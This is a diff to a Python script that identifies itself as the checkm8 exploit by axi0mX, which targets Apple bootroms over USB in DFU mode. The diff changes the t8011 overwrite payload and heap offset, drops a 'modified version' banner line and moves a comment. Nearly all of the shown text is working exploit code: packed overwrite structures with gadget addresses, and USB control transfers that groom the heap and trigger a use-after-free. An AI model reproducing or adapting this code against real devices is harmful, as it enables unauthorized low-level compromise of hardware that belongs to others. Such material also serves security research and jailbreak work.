@@ -434,16 +434,15 @@ def all_exploit_configs():
   t800x_overwrite    = struct.pack('<20xI4x', 0x48818000)
   s5l8960x_overwrite = struct.pack('<32xQ8x', 0x180380000)
   t8010_overwrite    = struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
-  t8011_overwrite    = struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8011_overwrite    = struct.pack('<32x2Q', t8011_nop_gadget, 0x1800B0800)
   t8015_overwrite    = struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
   
-  # Use offsets to not trash the heap
   s5l8947x_overwrite_offset = 0x660
   s5l895xx_overwrite_offset = 0x640
   t800x_overwrite_offset    = 0x5C0
   s5l8960x_overwrite_offset = 0x580
   t8010_overwrite_offset    = 0x580
-  t8011_overwrite_offset    = 0x500
+  t8011_overwrite_offset    = 0x540
   t8015_overwrite_offset    = 0x500
 
   return [
@@ -472,7 +471,6 @@ def exploit_config(serial_number):
 
 def exploit():
   print '*** checkm8 exploit by axi0mX ***'
-  print '*** modified version by Linus Henze ***'
 
   device = dfu.acquire_device()
   start = time.time()
@@ -499,9 +497,7 @@ def exploit():
   device = dfu.acquire_device()
   device.serial_number
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
-
-  # Advance buffer offset before triggering the UaF to prevent trashing the heap
-  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * config.overwrite_offset, 10)
+  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * config.overwrite_offset, 10) # Advance buffer offset before UaF to prevent trashing the heap
   libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   dfu.release_device(device)
 
